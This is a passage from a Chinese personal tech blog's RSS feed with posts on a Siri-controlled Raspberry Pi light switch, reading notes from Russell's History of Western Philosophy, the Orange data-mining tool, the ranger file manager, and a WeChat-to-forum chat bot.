&lt;h1&gt;软件部分&lt;/h1&gt;
&lt;p&gt;按照一般的套路，此处应该从舵机的驱动程序写起，加上通讯模块，接着写一些胶水程序黏合它们，组成实现完整的功能&lt;/p&gt;
&lt;p&gt;软件部分如开篇所说，这次我想试试不通过编程的方式来完成这个工作. 仅仅通过拖拽功能模块，我们就能拼出功能的机器人,这样可以让更多的人参与进来&lt;/p&gt;
&lt;p&gt;我已经完成了积木式的控制平台,硬件驱动全部封装为积木块(让每个人实现一次硬件驱动未免无聊)，拖曳即可，支持几乎完备的编程要素，可以实现丰富的功能&lt;/p&gt;
&lt;p&gt;我们来拖曳模块完成任务，Siri的请求本身被我封装为模块&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri.gif" /&gt;&lt;/p&gt;
&lt;p&gt;完成后，程序为: &lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri15bab0b4.png" /&gt;&lt;/p&gt;
&lt;p&gt;至于对原理有兴趣的geek小伙伴，在之后的文章里，我们再来讲解细节实现,实际hack了Siri&lt;/p&gt;
&lt;h1&gt;效果演示&lt;/h1&gt;
&lt;p&gt;点击"运行程序"，程序就会在树莓派中运行（开机自启）,我们做个演示&lt;/p&gt;
&lt;video src="http://ocfy0072v.bkt.clouddn.com/siri-%E5%85%B3%E7%81%AF-1.mp4" controls="controls"&gt;&lt;/video&gt;

&lt;h1&gt;自然语言&lt;/h1&gt;
&lt;p&gt;因为Siri本身具有处理自然语言的能力，我们可以用许多说法来关灯&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/siri05dcb491.png" /&gt;&lt;/p&gt;
&lt;h1&gt;todo&lt;/h1&gt;
&lt;p&gt;当前的自然语言处理(NLU)用得到了Siri，下一个版本想试试&lt;a href="http://www.yige.ai/"&gt;yige.ai&lt;/a&gt;,然后把它植入到微信中，这样可以跨平台使用它&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 24 Dec 2016 00:00:00 +0000</pubDate><guid>tag:,2016-12-24:rpi-siri-close-light.html</guid><category>rpi</category></item><item><title>西方哲学史</title><link>/A-History-of-Western-Philosophy.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;***摘自《西方哲学史》&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt;*&lt;/p&gt;
&lt;p&gt;之前和朋友聊天，聊到罗素，我的体验是：读罗素的东西，常一种被厚实的风趣击中，趣味绵绵不绝，后劲十足。&lt;/p&gt;
&lt;p&gt;西方哲学史，我读过斯通普夫和罗素的版本，喜欢罗素的多些，虽偏颇，却趣味十足，罗素式的风趣与机敏跃然纸上，精彩处，拍案叫绝，走在半路，念起其中精辟段落，会傻笑不能自己&lt;/p&gt;
&lt;p&gt;之前在ipad中的读书摘记不小心都弄没了，罗素的《西方哲学史》和《哲学问题》都是在ipad上读的,两本书都喜欢极了，最近在kindle重读这本书，边读边导出笔记&lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们指责他的贫困，认为这就说明了哲学是无用的。据这个故事说，他由于精通天象，所以还在冬天的时候就知道来年的橄榄要有一场大丰收；于是他以他所有的一点钱作为租用丘斯和米利都的全部橄榄榨油器的押金，由于当时没有人跟他争价，他的租价是很低的。到了收获的时节，突然间需要许多榨油器，他就恣意地抬高价钱，于是赚了一大笔钱；这样他就向世界证明了只要哲学家们愿意，就很容易发财致富，但是他们的雄心却是属于另外的一种&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;毕达哥拉斯对古代和近代的影响是我这一章的主题；无论就他的聪明而论或是就他的不聪明而论&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;近代关于真理的定义，例如实用主义的和工具主义的关于真理的定义，就是实用的而不是沉思的，它是由于与贵族政权相反对的工业文明所激起的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;天文学和占星学联系在一片，化学和炼丹术联系在一片。数学则结合了一种更精致的错误类型。数学的知识看来是可靠的、准确的，而且可以应用于真实的世界。此外，它还是由于纯粹的思维而获得的，并不需要观察。因此之故，人们就以为它提供了日常经验的知识所无能为力的理想。人们根据数学便设想思想是高于感官的，直觉是高于观察的。如果感官世界与数学不符，那么感官世界就更糟糕了。人们便以各种不同的方式寻求更能接近于数学家的理想的方法，而结果所得的种种启示就成了形而上学与知识论中许多错误的根源。这种哲学形式也是从毕达哥拉斯开始的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;独立宣言说：“我们认为这些真理是自明的”，其本身便脱胎于欧几里德。十八世纪天赋人权的学说，就是一种在政治方面追求欧几里德式的公理。牛顿的《原理》一书，尽管它的材料公认是经验的，但是它的形式却完全是被欧几里德所支配着的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我相信，数学是我们信仰永恒的与严格的真理的主要根源，也是信仰有一个超感的可知的世界的主要根源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;即一切严格的推理只能应用于与可感觉的对象相对立的理想对象；很自然地可以再进一步论证说，思想要比感官更高贵而思想的对象要比感官知觉的对象更真实&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;神秘主义关于时间与永恒的关系的学说，也是被纯粹数学所巩固起来的；因为数学的对象，例如数，如其是真实的话，必然是永恒的而不在时间之内。这种永恒的对象就可以被想象成为上帝的思想&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;与启示的宗教相对立的理性主义的宗教，自从毕达哥拉斯之后，尤其是从柏拉图之后，一直是完全被数学和数学方法所支配着的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓柏拉图主义的东西倘若加以分析，就可以发现在本质上不过是毕达哥拉斯主义罢了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;学习着按照每一种体系来理解宇宙乃是想象力的一种愉悦，并且是教条主义的一付解毒剂&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;它是根据自明的东西而进行演绎的推理，而不是根据已观察到的事物而进行归纳的推理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只要我们想一想任何一个现代哲学家如果仅仅是通过他的敌人的论战才被我们知道，那末他会变成什么样子的时候；我们就可以想见苏格拉底以前的人物应该是多么地值得赞叹，因为即使是通过他们的敌人所散布的恶意的烟幕，他们仍然显得十分伟大。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;科学正象哲学一样，也要在变化的现象之中寻找某种永恒的基础，以求逃避永恒流变的学说。化学似乎可以满足这种愿望。人们发现了那似乎在毁灭着万物的火，只不过是使万物变形而已；原素可以重新结合起来，燃烧之前就已存在的每一个原子经过燃烧过程之后，仍然继续存在着&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;并没有两个人用同一字的时候，在他们的心目中恰好有着同一的思想&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;哲学理论，如果它们是重要的，通常总可以在其原来的叙述形式被驳斥之后又以新的形式复活。反驳很少能是最后不易的；在大多数情况下，它们只是更进一步精炼化的一幕序曲而已。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;实体被人设想为是变化不同的谓语之永恒不变的主词。它就这样变成为哲学、心理学、物理学和神学中的根本概念之一，而且两千多年以来一直如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;马修·阿诺德用这个题材写过一首诗，虽然那可以说是他的最坏的诗篇之一&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;柏拉图有一段最有名的文章，他把这个世界比做是一个洞穴，我们在洞穴里面只能看到外面明朗世界的各种现实的暗影，而这是恩培多克勒所预示过的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;但是就在这一方面，他也不见得比起许多近代的科学家来更为不如。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在胜利和财富和需要重建的刺激之下，出现了大批的建筑家、雕刻家和戏剧家，他们直到今天还是不可企及的，他们所产生的作品左右着后人直迄近代。当我们想到它的人口数量之少的时候，这一点就格外令人感到惊异了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在那个时代正象在为数很少的其他时代里一样，人们可能既有才智而又有幸福，而且还是通过才智而得到幸福的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;waiting&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 19 Dec 2016 00:00:00 +0000</pubDate><guid>tag:,2016-12-19:A-History-of-Western-Philosophy.html</guid><category>book</category></item><item><title>易上手的数据挖掘、可视化与机器学习工具:Orange介绍</title><link>/Orange-startup.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orange1577a767.png" /&gt;&lt;/p&gt;
&lt;p&gt;之前陆续写过几篇介绍数据挖掘/可视化项目&lt;a href="https://github.com/airbnb/superset"&gt;Caravel&lt;/a&gt;的文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-startup-and-install.html"&gt;caravel系列之安装与入门&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-config.html"&gt;caravel系列之简易配置/定制&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-demo-analysis.html"&gt;caravel系列之案例讲解与分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/caravel-code.html"&gt;caravel系列之架构与源码浅析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如今直接去github搜索caravel已经搜不到它了。它最近换了新马甲，改叫&lt;a href="https://github.com/airbnb/superset"&gt;superset&lt;/a&gt;，至于为何频繁改名（分别叫过Panoramix，Caravel，Superset），我猜核心作者早年混迹论坛，与人吵架，常换马甲：）&lt;/p&gt;
&lt;p&gt;对数据可视化的兴趣一直未减，近期发现两个有趣的项目，其一就是这篇文章的主角:&lt;a href="https://github.com/biolab/orange3"&gt;Orange&lt;/a&gt;,另一个是google发布的Embedding Projector（基于Tensorflow）&lt;/p&gt;
&lt;h1&gt;Orange初体验&lt;/h1&gt;
&lt;p&gt;现在，你可以直接在&lt;a href="http://orange.biolab.si/download/"&gt;这里&lt;/a&gt;下载到最新的Orange软件，Orange发布了各个平台的安装包，选择你当前平台的安装包，双击安装即可，安装过程十分友好。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orange0676212b.png" /&gt;&lt;/p&gt;
&lt;p&gt;和许多数据分析的项目不同，其他项目多数面向数据分析从业人员、软件开发者。而Orange让各行各业对数据挖掘和可视化感兴趣的人都能参与其中，而不必有编程基础&lt;/p&gt;
&lt;p&gt;安装完毕打开软件，跟着以下教程即可对它做大致了解&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orangeaf0f7d8a.png" /&gt;&lt;/p&gt;
&lt;h1&gt;简介&lt;/h1&gt;
&lt;p&gt;官方首页对这个项目的介绍是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Open source machine learning and data visualization for novice and expert. Interactive data analysis workflows with a large toolbox.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;该项目源码开放，对新手友好，同时也胜任专业的数据分析工作。&lt;/p&gt;
&lt;p&gt;Orange是一个基于组件的数据挖掘软件，它包含了一组数据可视化、探索、预处理和建模的技术。&lt;/p&gt;
&lt;p&gt;它不但带有一个新手友好的用户界面，老司机们也可以把它用作Python的一个模块。&lt;/p&gt;
&lt;h1&gt;标签&lt;/h1&gt;
&lt;p&gt;如果要用一些简单的词描述它，我想到以下标签:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开源 &lt;/li&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;数据可视化&lt;/li&gt;
&lt;li&gt;数据模式探索&lt;/li&gt;
&lt;li&gt;机器学习 &lt;/li&gt;
&lt;li&gt;拖曳式&lt;/li&gt;
&lt;li&gt;积木化&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;交互式的数据可视化探索：你可以用它做简单的分析，诸如统计分布、箱形图（Box plot）、散点图。也可以做深入挖掘，诸如使用决策树、聚类、热图等。通过智能的属性选择，你可以在2维平面上探索多维数据&lt;/li&gt;
&lt;li&gt;可视化编程：图形化界面允许你专注于探索数据，而不是编码。你要做的事只是在画布上拖曳小部件、连接它们、加载数据集，如此便可获得数据洞察力！&lt;/li&gt;
&lt;li&gt;适合用于教学（jupyter出自生物学家之手，Orange似乎也和生物学领域有关，他们都让数据分析工作的协作交流变得简单有趣）&lt;/li&gt;
&lt;li&gt;附加扩展功能：通过使用各种插件，我们可以做各种各样的事：&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;*  对外部数据源进行数据挖掘（数据库/网络）
*  自然语言处理以及文本挖掘
*  网络分析
*  关联规则分析
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/orangeacf72e02.png" /&gt;&lt;/p&gt;
&lt;h1&gt;优势&lt;/h1&gt;
&lt;p&gt;我折腾过的数据可视化工具多而杂， 以下是我偏好Orange的几个原因&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装极其建议（二进制安装包）&lt;/li&gt;
&lt;li&gt;对新手友好，易于上手，许多操作凭直觉即可甚至不需要文档&lt;/li&gt;
&lt;li&gt;让普通用户能使用机器学习去发现数据模式，这项工作之前往往需要技术背景&lt;/li&gt;
&lt;li&gt;支持excel文件直接导入&lt;/li&gt;
&lt;li&gt;对中文支持良好（目前尚未遇到乱码）&lt;/li&gt;
&lt;li&gt;可视化的编程方式，用户无需编码，数据在各个组件里流动，通过拖曳组件即可开始探索数据&lt;/li&gt;
&lt;li&gt;交互式的探索过程，每一个组件叠加都能及时得到反馈。如同REPL(读取﹣求值﹣输出循环)般敏捷顺滑&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;不足&lt;/h1&gt;
&lt;p&gt;同时也简单列出我认为不足的地方&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对数据源的支持不够丰富，目前Orange3只支持PostgreSQL数据库，当然这是站在开发者的角度的挑刺，普通用户对此没有需求&lt;/li&gt;
&lt;li&gt;无法像tableau一样把探索结果作为网页发布。不过浏览了一遍官方源码库，他们似乎有这个计划。把它和superset整合在一起，指不定能折腾出一个商业应用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关于对数据库的支持，估计随着项目的推进，会慢慢完备起来，这块基本只是时间的问题&lt;/p&gt;
&lt;h1&gt;后续&lt;/h1&gt;
&lt;p&gt;接下来有空我们分析下，这个项目在技术层面有哪些有趣的东西&lt;/p&gt;
&lt;p&gt;此外我还有兴趣对它做些本地化改进，包括但不限于汉化，有兴趣的小伙伴可以一起来折腾，我已经fork了一份源码：&lt;a href="https://github.com/openEduClub/orange3"&gt;orange3&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/biolab/orange3"&gt;orange3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://orange.biolab.si/"&gt;orange.biolab.si&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://my.oschina.net/u/2306127/blog/548833"&gt;Orange-数据挖掘和机器学习软件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hao.jobbole.com/orange/"&gt;Orange：通过可视化编程或 Python 脚本进行数据挖掘、数据可视化、分析和机器学习&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 19 Dec 2016 00:00:00 +0000</pubDate><guid>tag:,2016-12-19:Orange-startup.html</guid><category>data</category></item><item><title>从Finder迁往ranger</title><link>/from-finder-to-ranger.html</link><description>&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/ranger49251562.png" /&gt;&lt;/p&gt;
&lt;p&gt;Mac下有许多好用的生产力工具，从iTerm到Moom,细节打磨的很细腻，常有令人意外的惊喜。而另一些工具让人用着仿佛置身于远古时代，Finder是其一&lt;/p&gt;
&lt;p&gt;对Finder积怨已久。我在mac每做10件蠢事，大约有8件发生在Finder里&lt;/p&gt;
&lt;h1&gt;与Finder结怨&lt;/h1&gt;
&lt;h3&gt;复制文件&lt;/h3&gt;
&lt;p&gt;当我在notebooks目录下写文章（这篇博客也是），突然想把临时文件夹里的截图放到文章里，我要先把它复制到当前目录（以便和文章一同纳入版本管理），然后引用它。&lt;/p&gt;
&lt;p&gt;此前，我先把当前目录切割文左右窗口布局（利用XtraFinder）,接着在一个窗口里沿着目录一层层找到需要的文件，再拖拽过来（由于没有剪切/复制/粘贴这种选项，只能用拖），如果一次拖多个文件，得更小心翼翼一些，放准位置。&lt;/p&gt;
&lt;p&gt;如果只是这样也还勉强凑合&lt;/p&gt;
&lt;p&gt;上上周我把系统升级到10.12（macOS Sierra）。郁闷的一点是XtraFinder暂不支持这个版本，于是我的复制过程变成了:手动打开两个窗口,调整好左右布局，傻乎乎地拖拽。&lt;/p&gt;
&lt;p&gt;ps :  之所以不直接使用cp是因为写文章时，Finder一般处于open状态,用它拖拉文件感觉也直观,使用cp除非对文件所在位置确信无疑，否则在目录树里穿梭很累&lt;/p&gt;
&lt;h3&gt;文件路径&lt;/h3&gt;
&lt;p&gt;你在目录里游荡，找到想进入的目录，你如何在当前目录打开shell呢，XtraFinder能用的时候，右键就有这个选项。如今XtraFinder不能用，我只好打开iTerm，把目标目录拖进iTerm&lt;/p&gt;
&lt;p&gt;我挺讨厌拖曳操作，每次我都得重新调整窗口布局（Moom），拖完再用Moom把shell最大化&lt;/p&gt;
&lt;p&gt;和文件路径相关的另一个操作是:在编辑器里打开项目目录。听完最近一期的内核恐慌，试了下vscode，觉得顺手。当我在目录树里穿梭，想用vscode打开当前项目，依然需要在vscode里重新在Finder的目录树中找目录，十分烦人（这个问题在ranger有完美解决方案）&lt;/p&gt;
&lt;h3&gt;速度!&lt;/h3&gt;
&lt;p&gt;关于速度吐两个槽&lt;/p&gt;
&lt;p&gt;其一是启动Finder，默认打开&lt;code&gt;我的所有文件&lt;/code&gt;,我大概需要给它一首歌的时间才能加载出来（稍微一点点夸张）&lt;/p&gt;
&lt;p&gt;其二是升级到10.12后，Finder似乎不稳定，时常会占用大量资源，导致电脑发热卡顿，在网上也看到不少这个现象&lt;/p&gt;
&lt;h2&gt;对Finder总结&lt;/h2&gt;
&lt;p&gt;如果你是一名开发者，对目录操作频繁，又十分不想离开GUI，使用Finder时请搭配XtraFinder（暂时不要升级到10.12，否则用不了XtraFinder），或者直接购买Path Finder，这款软件更像为开发者准备的文件管理器，售价好像是$37.5&lt;/p&gt;
&lt;p&gt;如果你喜欢CLI风格的界面，那么快上车&lt;/p&gt;
&lt;h1&gt;ranger带来的福音&lt;/h1&gt;
&lt;p&gt;如果你习惯在命令行下工作，还是vim党，那么ranger简直就是你的福音&lt;/p&gt;
&lt;p&gt;自从用了ranger，腰不酸，腿不痛，一口气爬五楼都不累了&lt;/p&gt;
&lt;h2&gt;介绍&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ranger is a  VIM-inspired filemanager for the console&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;与ranger的结识是因为是实在受不了Finder。于是google搜了一番，偶然看到ranger，耳目一新。几乎完美解决我所有的问题，所有！&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;与君初相识,犹如故人归&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/ranger/ranger"&gt;ranger&lt;/a&gt; 是一个由python写成的文件管理器，使用 vi 键绑定,不同层级的目录分别在一个面板的三列中进行展示. 可以通过快捷键, 书签, 鼠标以及历史命令在它们之间移动. 当选中文件或目录时, 会自动显示文件或目录的内容.&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;mac: brew install ranger&lt;/li&gt;
&lt;li&gt;ubuntu: sudo apt-get install ranger&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;主要特性&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;vi 风格的快捷键&lt;/li&gt;
&lt;li&gt;书签&lt;/li&gt;
&lt;li&gt;选择&lt;/li&gt;
&lt;li&gt;标签&lt;/li&gt;
&lt;li&gt;选项卡&lt;/li&gt;
&lt;li&gt;命令历史&lt;/li&gt;
&lt;li&gt;创建符号链接的能力&lt;/li&gt;
&lt;li&gt;多种终端模式&lt;/li&gt;
&lt;li&gt;任务视图&lt;/li&gt;
&lt;li&gt;可定制命令和快捷键，包括绑定到外部脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果你熟悉vim，想当然地使用就行，遇到问题输入&lt;code&gt;?&lt;/code&gt;查看帮助，如果你觉得对着详细的操作文档比较踏实，可以参考这篇文章:&lt;a href="http://www.mikewootc.com/wiki/linux/usage/ranger_file_manager.html"&gt;linux终端文件管理器ranger使用详解&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;以思维的速度操作目录&lt;/h3&gt;
&lt;p&gt;vim允许你"以思维的速度操控文本"&lt;/p&gt;
&lt;p&gt;ranger允许你借用vim的快捷键，以思维的速度操控目录&lt;/p&gt;
&lt;p&gt;我在没读文档时，想当然地用vim的search功能，居然可以在当前目录搜索文件名，惊艳不已&lt;/p&gt;
&lt;p&gt;至于前头在Finder中遇到文件复制问题，只需要用&lt;code&gt;yy&lt;/code&gt;复制文件，&lt;code&gt;pp&lt;/code&gt;粘贴到目标目录下即可。和在vim下赋值文本完全相同&lt;/p&gt;
&lt;h3&gt;调用编辑器打开项目&lt;/h3&gt;
&lt;p&gt;前头我们说到一个场景：当浏览目录是，突然想用编辑器打开一个目录来编写项目。在ranger里使用&lt;code&gt;:open_with xxx&lt;/code&gt;就行，诸如我想用vscode，我只要输入&lt;code&gt;:open_with code&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果你和我一样大多时间使用vim，那么移动到文件直接回车就行&lt;/p&gt;
&lt;p&gt;如果你偏好sublime你可以：&lt;code&gt;open_with subl&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;至于可以接入哪个编辑器，由你决定，只要你的编辑器能在命令行里打开就行（不知如何在命令行打开vscode/sublime/macvim，可以自行google）&lt;/p&gt;
&lt;h3&gt;速度&lt;/h3&gt;
&lt;p&gt;在速度方面，ranger与Finder的差别，约同Chrome与IE的区别&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://www.vaikan.com/wordpress/wp-content/uploads/2013/08/ie3.jpg" /&gt; &lt;/p&gt;
&lt;h1&gt;搭配&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;查找大文件: ncdu&lt;/li&gt;
&lt;li&gt;快速移动位置 : z&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ranger/ranger"&gt;ranger/ranger)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/ranger_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)"&gt;Ranger (简体中文)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://linux.cn/article-1995-1.html"&gt;Ranger – 给命令行用户一个基于文本的文件管理器&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mikewootc.com/wiki/linux/usage/ranger_file_manager.html"&gt;linux终端文件管理器ranger使用详解&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 29 Nov 2016 00:00:00 +0000</pubDate><guid>tag:,2016-11-29:from-finder-to-ranger.html</guid><category>tools</category></item><item><title>论坛机器人的技术实现</title><link>/paperweekly-forum-bot.html</link><description>&lt;p&gt;&lt;img alt="" src="https://raw.githubusercontent.com/wwj718/gif_bed/master/paperweekly_all.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;前言&lt;/h1&gt;
&lt;p&gt;@张俊同学有天晚上邀我写一期文章，介绍论坛机器人的技术实现。登时诚惶诚恐，群里大神云集，我此前写的这个粗陋的机器人实在难登大雅之堂。考虑到机器人还在群里头用，就献丑来简单介绍下技术层面的实现，方便大家日后改进它 ：）&lt;/p&gt;
&lt;p&gt;本文侧重谈论整体的设计和实现，至于细节，大家可以看&lt;a href="https://github.com/wwj718/paperweekly_forum"&gt;源码&lt;/a&gt;和文档(文档在doc目录下)  ：）&lt;/p&gt;
&lt;h1&gt;功能&lt;/h1&gt;
&lt;p&gt;论坛机器人目前实现了三个功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;微信群与&lt;a href="http://paperweekly.club"&gt;paperweekly论坛&lt;/a&gt;的双向通信(发帖/回复)&lt;/li&gt;
&lt;li&gt;paperweekly1群和2群的消息转发（当前只支持文本和表情）&lt;ul&gt;
&lt;li&gt;更多功能(图片/链接/跨群@)在todo list中&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;问题检索&lt;ul&gt;
&lt;li&gt;支持中文提问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;以上三个功能按实现的先后排序。下边分别简述这三个功能的实现&lt;/p&gt;
&lt;h2&gt;微信群与paperweekly论坛的双向通信&lt;/h2&gt;
&lt;p&gt;先贴上实际使用的截图：&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/paperweekly_bbsc5fb270e.png" /&gt;&lt;/p&gt;
&lt;p&gt;这个功能是最初的需求，@张俊同学觉得群聊消息归档不便，不利于深入讨论问题。为了更加高效的分类和管理大家讨论的精华（QA对），想做个bot，与外部论坛打通，便于归档优质的讨论内容。大家群聊的时候只要按照特定格式发言，机器人就能将信息转发到论坛中，用论坛来保存这些讨论信息&lt;/p&gt;
&lt;p&gt;关于最初我们试图解决的问题，@张俊同学在&lt;a href="http://mp.weixin.qq.com/s?__biz=MzIwMTc4ODE0Mw==&amp;amp;mid=2247483940&amp;amp;idx=1&amp;amp;sn=554573482078e34e8909eeaa4030adec&amp;amp;chksm=96e9dda4a19e54b2f518759b214bd503c245991c40a3315a6daa3bb62aa7a455f54d62bdf050&amp;amp;scene=4#wechat_redirect"&gt;PaperWeekly十期总结&lt;/a&gt;的Issue 2里写的很详细，对项目背景有兴趣的同学可以参考&lt;/p&gt;
&lt;p&gt;最初的需求描述如下（来自@张俊）:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://oav6fgfj1.bkt.clouddn.com/paperweeklyae5df2dd.png" /&gt;  &lt;/p&gt;
&lt;p&gt;我觉得这个想法很有趣，决定一试。用了一个晚上实现了微信与论坛的通信机制（大半时间在熟悉Misago）。次日早起，调试完成，后来也没空去重构代码，&lt;a href="https://github.com/wwj718/paperweekly_forum/blob/master/wechat_bot/paperweeklybot.py"&gt;这部分代码&lt;/a&gt;很丑陋（quick and dirty），欢迎有兴趣的小伙伴帮忙重构&lt;/p&gt;
&lt;h3&gt;思路与实现&lt;/h3&gt;
&lt;p&gt;微信群与paperweekly论坛双向通信问题，实际上是个消息转发问题。消息无非两种流向:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;来自群聊的消息发往论坛&lt;/li&gt;
&lt;li&gt;来自论坛的讨论发往微信群&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;消息的流向可以从这张图里看出:（这张图也描述了项目的结构和数据流）&lt;/p&gt;
